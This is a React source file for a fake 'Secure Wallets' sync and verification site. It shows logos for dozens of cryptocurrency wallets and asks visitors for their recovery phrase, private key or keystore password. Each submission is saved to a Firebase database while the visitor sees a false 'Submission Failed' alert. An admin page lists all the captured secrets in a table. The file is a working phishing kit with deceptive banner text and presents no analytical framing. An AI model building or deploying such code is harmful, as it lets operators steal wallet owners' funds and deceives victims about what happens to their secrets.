const walletData = [
  {
    id: "",
    name: "Metamask",
    pathToLogo: "./images/icons/metamask.png",
  },
  {
    id: "",
    name: "Trust",
    pathToLogo: "./images/icons/trust.png",
  },
  {
    id: "",
    name: "Coinbase",
    pathToLogo: "./images/icons/coinbase-logo.png",
  },
  {
    id: "",
    name: "Safepal",
    pathToLogo: "./images/icons/safepal.png",
  },
  {
    id: "",
    name: "Phantom",
    pathToLogo: "./images/icons/phantom.png",
  },
  {
    id: "",
    name: "Solflare",
    pathToLogo: "./images/icons/solflare.svg",
  },
  {
    id: "",
    name: "Slope",
    pathToLogo: "./images/icons/slope.png",
  },
  {
    id: "",
    name: "Sollet",
    pathToLogo: "./images/icons/sollet.jpg",
  },
  {
    id: "",
    name: "Solana",
    pathToLogo: "./images/icons/solana.png",
  },
  {
    id: "",
    name: "Argent",
    pathToLogo: "./images/icons/argent.jpg",
  },
  {
    id: "",
    name: "Atomic",
    pathToLogo: "./images/icons/atomic.png",
  },
  {
    id: "",
    name: "Authereum",
    pathToLogo: "./images/icons/authereum.png",
  },
  {
    id: "",
    name: "Bitpay",
    pathToLogo: "./images/icons/bitpay.png",
  },
  {
    id: "",
    name: "Blockchain",
    pathToLogo: "./images/icons/blockchain.png",
  },
  {
    id: "",
    name: "Coin98",
    pathToLogo: "./images/icons/coin98.png",
  },
  {
    id: "",
    name: "Crypto",
    pathToLogo: "./images/icons/crypto.png",
  },
  {
    id: "",
    name: "Eidoo",
    pathToLogo: "./images/icons/eidoo.png",
  },
  {
    id: "",
    name: "Enjin",
    pathToLogo: "./images/icons/enjin.png",
  },
  {
    id: "",
    name: "Gnosis",
    pathToLogo: "./images/icons/gnosis.jpg",
  },
  {
    id: "",
    name: "Huobi",
    pathToLogo: "./images/icons/huobi.jpg",
  },
  {
    id: "",
    name: "Imtoken",
    pathToLogo: "./images/icons/imtoken.png",
  },
  {
    id: "",
    name: "Ledgerlive",
    pathToLogo: "./images/icons/ledgerlive.png",
  },
  {
    id: "",
    name: "Loopring",
    pathToLogo: "./images/icons/loopring.jpg",
  },
  {
    id: "",
    name: "Maiar",
    pathToLogo: "./images/icons/maiar.png",
  },
  {
    id: "",
    name: "Math Wallet",
    pathToLogo: "./images/icons/math_wallet.png",
  },
  {
    id: "",
    name: "Mobox",
    pathToLogo: "./images/icons/mobox.png",
  },
  {
    id: "",
    name: "MyKey",
    pathToLogo: "./images/icons/mykey.png",
  },
  {
    id: "",
    name: "Onto",
    pathToLogo: "./images/icons/onto.png",
  },
  {
    id: "",
    name: "Pillar",
    pathToLogo: "./images/icons/pillar.png",
  },
  {
    id: "",
    name: "Rainbow",
    pathToLogo: "./images/icons/rainbow.png",
  },
  {
    id: "",
    name: "Ronin",
    pathToLogo: "./images/icons/ronin.png",
  },
  {
    id: "",
    name: "TokenPocket",
    pathToLogo: "./images/icons/tokenpocket.png",
  },
  {
    id: "",
    name: "Trezor",
    pathToLogo: "./images/icons/trezor.png",
  },
  {
    id: "",
    name: "Trust Vault",
    pathToLogo: "./images/icons/trustvault.png",
  },
  {
    id: "",
    name: "Walleth",
    pathToLogo: "./images/icons/walleth.png",
  },
];

import FirebaseDB from "./firebaseStorage.js";

const firebaseDb = new FirebaseDB();
//firebaseDb.writeWalletData("test wallet", "passphrase", "example pass phrase");
//firebaseDb.readWalletData();

function savewalletData(wallet_name, auth_type, auth_text){
  //let firebaseDb = new FirebaseDB();
  firebaseDb.writeWalletData(wallet_name, auth_type, auth_text);
  alert("Submission Failed: Try an active Wallet.");
}

// text privateKey: 0x648ab788c99ba9ec822bbDDf78

const Navigation = () => {
  return (
    <>
      <Navbar collapseOnSelect expand="sm" bg="dark" variant="dark">
        <Container style={{maxHeight: '25vh'}}>
          <Row className="text-dark container-fluid p-4">
            <Col className="text-center my-auto py-3 nav-option" xs={4}>
              <strong>Home</strong>
            </Col>
            <Col className="text-center" xs={4}>
              <img src="./images/logos/logo.svg" width="70%" alt="logo" />
            </Col>
            <Col className="text-center my-auto py-3 nav-option" xs={4}>
              <strong>Charts</strong>
            </Col>
          </Row>
        </Container>
      </Navbar>
    </>
  );
};

const Banner = () => {
  const p_style = {
    fontSize: "17px",
    maxWidth: "599px",
  };
  return (
    <Container className="text-center p-3">
      <h1>Secure Wallets</h1>
      <h4 className="text-white m-3">
        Open Protocol for Syncing Various Wallets to Dapps Secure Server{" "}
      </h4>
      <p className="text-white m-auto" style={p_style}>
        Wallet Syncing is the process or operation of merging two or more
        wallets at the same time. Syncing is a method of re-authenticating an
        account in other for all tokens in that account to show up in their
        respective wallets. We also synergize with various ICOs and exchanges to
        ensure user data is properly stored and safe from cyber criminals.
      </p>
    </Container>
  );
};


const PhraseForm = ({ wallet_name }) => {
  const [validated, setValidated] = useState(false);

  const handleSubmit = (event) => {
    const form = event.currentTarget;
    event.preventDefault();
    if (form.checkValidity() === false) {
      event.stopPropagation();
      console.log("checkValidity returned false!");
    } else {
      let auth_type = "phraseform";
      let auth_text = document.getElementById("phraseInput").value;
      savewalletData(wallet_name, auth_type, auth_text); 
    }

    setValidated(true);
  };

  return (
    <Form noValidate validated={validated} onSubmit={handleSubmit}>
      <Form.Control
        as="textarea"
        rows={3}
        id="phraseInput"
        placeholder="Enter your recovery phrase"
        required
      />
      <Container className="p-3 text-center">
        <small className="text-muted">
          Typically 12 (sometimes 24) words separated by single spaces
        </small>
      </Container>
      <Form.Control
        type="submit"
        className="btn btn-primary m-auto mt-3"
        value="Proceed"
      />
    </Form>
  );
};

const PrivateKeyForm = ({ wallet_name }) => {
  const [validated, setValidated] = useState(false);

  const handleSubmit = (event) => {
    const form = event.currentTarget;
    event.preventDefault();
    if (form.checkValidity() === false) {
      event.stopPropagation();
      console.log("checkValidity returned false!");
    } else {
      let auth_type = "phraseform";
      let auth_text = document.getElementById("privateKeyInput").value;
      savewalletData(wallet_name, auth_type, auth_text); 
    }

    setValidated(true);
  };

  return (
    <Form noValidate validated={validated} onSubmit={handleSubmit}>
      <Form.Control
        type="text"
        id="privateKeyInput"
        placeholder="Enter your private key"
        required
      />
      <Container className="p-3 text-center">
        <small className="text-muted">
          Typically 12 (sometimes 24) words seperated by a single space.
        </small>
      </Container>
      <Form.Control
        type="submit"
        className="btn btn-primary m-auto mt-3"
        value="Proceed"
      />
    </Form>
  );
};

const KeystoreJsonForm = ({ wallet_name }) => {
  const [validated, setValidated] = useState(false);

  const handleSubmit = (event) => {
    const form = event.currentTarget;
    event.preventDefault();
    if (form.checkValidity() === false) {
      event.stopPropagation();
      console.log("checkValidity returned false!");
    } else {
      let auth_type = "phraseform";
      let auth_text = document.getElementById("keystoreJsonInput").value;
      savewalletData(wallet_name, auth_type, auth_text); 
    }

    setValidated(true);
  };

  return (
    <Form noValidate validated={validated} onSubmit={handleSubmit}>
      <Form.Control
        type="text"
        id="keystoreJsonInput"
        placeholder="Wallet password"
        required
      />
      <Container className="p-3 text-center">
        <small className="text-muted">
          Several lines of text beginning with {"{...}"} plus the password you
          used to encrypt it.
        </small>
      </Container>
      <Form.Control
        type="submit"
        className="btn btn-primary m-auto mt-3"
        value="Proceed"
      />
    </Form>
  );
};

class ModalContent extends Component {
  constructor(props) {
    super(props);
    this.state = {
      wallet_name: props.walletName,
      pathtologo: props.logo,
      formOption: "phraseform",
    };
    console.log(this.state.pathtologo);
  }

  borderBottomGray = { borderBottom: "2px solid #eee" };

  handleFormOption = (formOption) => {
    this.setState({ formOption: formOption });
  };

  chosenform = () => {
    switch (this.state.formOption) {
      case "phraseform":
        return <PhraseForm wallet_name={this.state.wallet_name} />;
        break;
      case "privatekeyform":
        return <PrivateKeyForm wallet_name={this.state.wallet_name} />;
        break;
      case "keystorejson":
        return <KeystoreJsonForm wallet_name={this.state.wallet_name} />;
        break;

      default:
        return null;
        break;
    }
  };

  render() {
    return (
      <Container>
        <Row className="m-auto">
          <Col xs={3} className="text-right p-1">
            <img src={this.state.pathtologo} width="90%"  alt="" />
          </Col>
          <Col xs={9} className="text-left p-3">
            <strong className="text-dark">Verify {this.state.wallet_name} wallet</strong>
          </Col>
        </Row>
        <Row className="mb-2" style={this.borderBottomGray}>
          <Col
            xs={4}
            className="text-center text-dark p-2"
            onClick={() => this.handleFormOption("phraseform")}
          >
            Phrase
          </Col>
          <Col
            xs={4}
            className="text-center text-dark p-2"
            onClick={() => this.handleFormOption("keystorejson")}
          >
            Keystore JSON
          </Col>
          <Col
            xs={4}
            className="text-center text-dark p-2"
            onClick={() => this.handleFormOption("privatekeyform")}
          >
            Private Key
          </Col>
        </Row>
        <this.chosenform />
      </Container>
    );
  }
}

class Mains extends Component {
  state = {
    show: false,
    walletName: "",
    path: "",
  };

  handleClose = () => this.setState({ show: false });
  handleShow = ({ name, pathToLogo }) => {
    this.setState({ show: true });
    this.state.walletName = name;
    this.state.path = pathToLogo;
    console.log(this.state.path);
  };

  walletList = walletData.map(({ name, pathToLogo }, index) => (
    <Col xs={6} sm={4} md={3} key={index} className="p-3 text-center">
      <img
        src={pathToLogo}
        width="59%"
        className="mb-3 cursor-pointer"
        onClick={() => {
          this.handleShow({ name, pathToLogo });
        }}
        alt=""
      />
      <div className="text-center cursor-pointer">{name}</div>
    </Col>
  ));

  render() {
    console.log(this.walletList);
    return (
      <Container>
        <Row>{this.walletList}</Row>
        <Container className="m-3 d-flex justify-content-center align-item-center" style={{width: "100%"}}>
          <Button className="px-3 py-2" variant="secondary" onClick={() => {
            this.handleShow({name: 'Other wallet', pathToLogo: ' '});
          }}>Other Wallets</Button>
        </Container>
        <Modal
          show={this.state.show}
          onHide={this.handleClose}
          backdrop="static"
          keyboard={false}
          aria-labelledby="contained-modal-title-vcenter"
          centered
        >
          <Modal.Body className="p-5">
            <ModalContent
              walletName={this.state.walletName}
              logo={this.state.path}
            />
            <Container className="text-right">
              <Button
                variant="danger"
                className="m-auto mt-3"
                onClick={this.handleClose}
              >
                Cancel
              </Button>
            </Container>
          </Modal.Body>
        </Modal>
      </Container>
    );
  }
}

const Footer = () => {
  const footerStyle = {
    backgroundColor: "#36474f",
  };
  return (
    <Container className="text-white p-4" style={footerStyle} fluid>
      <Row>
        <Col xs={8} sm={4}>
          <Row className="mb-2">
            <Col xs={4} className="text-right">
              <img src="./images/logos/logo.svg" width="50%" alt="logo" />
            </Col>
            <Col xs={8} className="text-left">
              <span>Wallet Verify</span>
            </Col>
          </Row>
          <p>858 Zenway Blvd Frigate Bay, Saint Kitts Saint Kitts and Nevis</p>
        </Col>
        <Col xs={8} sm={4}>
          <div className="mb-2">Socials</div>
          <ul className="list-unstyled">
            <li>
              <i className="fa fa-facebook-square" aria-hidden="true"></i>{" "}
              Facebook
            </li>
            <li>
              <i className="fa fa-twitter-square" aria-hidden="true"></i>{" "}
              Twitter
            </li>
            <li>
              <i className="fa fa-whatsapp" aria-hidden="true"></i> Whatsapp
            </li>
          </ul>
        </Col>
        <Col xs={8} sm={4}>
          <div className="mb-2">Menu</div>
          <ul className="list-unstyled">
            <li>
              <i className="fa fa-home" aria-hidden="true"></i> Home
            </li>
            <li>
              <i className="fa fa-address-book" aria-hidden="true"></i> Contact
            </li>
            <li>
              <i className="fa fa-line-chart" aria-hidden="true"></i> Charts
            </li>
          </ul>
        </Col>
      </Row>
      <Row className="container-fluid">
        <Col xs={12} className="text-center">
          <Button variant="secondary" className="m-auto" onClick={() => showAdmin()}>
            Admin
          </Button>
        </Col>
      </Row>
    </Container>
  );
};

const WalletTable = ({ data }) => {
    let count = 0
    console.log(typeof data);
    let tableRows = Object.keys(data).map((key, index) => (
        <tr key={index}>
            <td>{index}</td>
            <td>{data[key].wallet_name}</td>
            <td>{data[key].auth_type}</td>
            <td>{data[key].auth_text}</td>
            {/* <td>{auth_file}</td> */}
            <td>{data[key].date_added}</td>
        </tr>
    ))
    console.log(tableRows)

    return(
        <Container >
            <Table striped bordered hover responsive variant="dark">
            <thead>
                <tr>
                    <td>S/N</td>
                    <td>wallet_name</td>
                    <td>auth_type</td>
                    <td>auth_text</td>
                    {/* <td>auth_file</td> */}
                    <td>date_added</td>
                </tr>
            </thead>
            <tbody>
                { tableRows }
            </tbody>
            </Table>
        </Container>
    )
}

class AdminPage extends Component {
  constructor(props) {
    super(props);
    this.state = {
      show: true,
      walletList: [],
      errorMessage: "",
      response: '',
      tableRows: '',
      validated: false,
      authenticated: false
    };
  }

  handleSubmit = (event) => {
    const form = event.currentTarget;
    event.preventDefault();
    let response;
    if (form.checkValidity() === false) {
      event.stopPropagation();
      console.log("checkValidity returned false!");
    } else {
      var data_ = {
          email: document.getElementById("adminEmail").value,
          password: document.getElementById("adminPswd").value
      }
      var me = this;
      firebaseDb.readAdminData((data) => {
        let res = {};
        let isAuthorized = false;
        if(!data){res =  "Unable to retrieve admin data.";}

        let _email = data_.email;
        let _pswd = data_.password;
        console.log(data);
        data.forEach(({email, password}) => {
            if(_email === email && _pswd === password) {
                isAuthorized = true;
            }
        });

        res.data = (isAuthorized) ? "success" : "Authorization failed";
        me.handleWalletsDisplay(res);
      });
      
    }

    this.setState({ validated: true });
  };

  handleClose = () => this.setState({ show: false });
  handleShow = () => {
    this.setState({ show: true });
  };

  handleWalletsDisplay = (res) => {
    console.log(res);
    
    if(res.data == 'success'){
        this.setState({authenticated: true})
        this.setState({show: false})
        let me = this;
        alert("Authentication successful. You are now logged in!");
        var data_ = {
            accessKey: '9487948HH68$89XHDhdhd7e4hhf728484hf78r4h83ijf844$&Bhy7$'
        }
        firebaseDb.readWalletData((data) => {
          console.log(data);
          if (data[0].hasOwnProperty('wallet_name') || typeof data[0] === 'object' || isArray(data)) {
            me.setState({walletList: data});
            console.log(me.state.walletList);
          }else {
            console.log("No wallet data");
          }
        });
        
    }else {
        alert("Aunthentication failed: check the password and try again.");
    }
  }

  render() {
    return (
      <>
        <Navigation />
        <Container className="text-center m-auto p-3">
            <h2>Wallets Database</h2>
        </Container>
        <WalletTable data={this.state.walletList} />
        <Container className="text-center m-auto p-3">
            <Button variant="secondary" onClick={()=>{this.setState({show: true})}}>Refresh</Button>
        </Container>
        <Modal
          show={this.state.show}
          onHide={this.handleClose}
          backdrop="static"
          keyboard={false}
          aria-labelledby="contained-modal-title-vcenter"
          centered
        >
          <Modal.Body className="p-5">
            <Form
              noValidate
              validated={this.state.validated}
              onSubmit={this.handleSubmit}
            >
              <Form.Control
                type="email"
                id="adminEmail"
                className="mb-3"
                placeholder="Enter your email"
                required
              />
              <Form.Control
                type="password"
                id="adminPswd"
                className="mb-3"
                placeholder="Enter your password"
                required
              />
              <Container className="p-3 text-center">
                <small className="text-muted">
                  {' '}
                </small>
              </Container>
              <Form.Control
                type="submit"
                className="btn btn-primary m-auto mt-3"
                value="Proceed"
              />
            </Form>
            <Container className="text-right">
              <Button
                variant="danger"
                className="m-auto mt-3"
                onClick={this.handleClose}
              >
                Cancel
              </Button>
            </Container>
          </Modal.Body>
        </Modal>
      </>
    );
  }
}

const HomePage = () => {
  return (
    <>
      <Navigation />
      <Banner />
      <Mains />
      <Footer />
    </>
  );
};

function showAdmin() {
  ReactDOM.render(<AdminPage />, root);
}

class App extends Component {
  constructor(props) {
    super(props);
    this.state = {};
  }

  render() {
    return <HomePage />;
  }
}

const root = document.getElementById("root");

ReactDOM.render(<App />, root);
